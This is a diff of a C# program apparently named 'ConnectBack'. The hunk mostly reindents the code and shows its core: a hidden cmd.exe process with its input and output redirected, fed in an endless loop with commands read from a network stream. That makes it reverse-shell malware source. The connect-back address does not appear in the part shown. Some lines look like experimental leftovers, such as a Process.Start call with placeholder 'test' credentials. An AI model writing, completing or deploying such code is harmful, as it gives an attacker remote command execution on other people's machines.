@@ -19,35 +19,35 @@ namespace ConnectBack
 			{
 				using (Stream stream = client.GetStream())
 				{
-                    using (StreamReader rdr = new StreamReader(stream))
-                    {
-					
-                        streamWriter = new StreamWriter(stream);
+					    using (StreamReader rdr = new StreamReader(stream))
+					    {
 
-                        StringBuilder strInput = new StringBuilder();
+						streamWriter = new StreamWriter(stream);
+
+						StringBuilder strInput = new StringBuilder();
 						SecureString x = new SecureString();
 						Process p = new Process();
-                        p = Process.Start("cmd.exe","test","",x,"test");
-                        p.StartInfo.FileName = "cmd.exe";
-                        p.StartInfo.CreateNoWindow = true;
-                        // p.StartInfo.UseShellExecute = false;
-                        p.StartInfo.RedirectStandardOutput = true;
-                        p.StartInfo.RedirectStandardInput = true;
-                        p.StartInfo.RedirectStandardError = true;
-                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                        // p.Start("cmd.exe","test","test",x,"test");
-						p.Start();
-                        p.BeginOutputReadLine();
+						p = Process.Start("cmd.exe","test","",x,"test");
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						// p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						// p.Start("cmd.exe","test","test",x,"test");
+									p.Start();
+						p.BeginOutputReadLine();
 
-                        while (true)
-                        {
-                            strInput.Append(rdr.ReadLine());
-                            strInput.Append("\n");
-                            p.StandardInput.WriteLine(strInput);
-                            strInput.Remove(0, strInput.Length);
-                        }
-                    }
-                }
+						while (true)
+						{
+						    strInput.Append(rdr.ReadLine());
+						    strInput.Append("\n");
+						    p.StandardInput.WriteLine(strInput);
+						    strInput.Remove(0, strInput.Length);
+						}
+                   		 	}
+               			 }
 			}
 		}
 
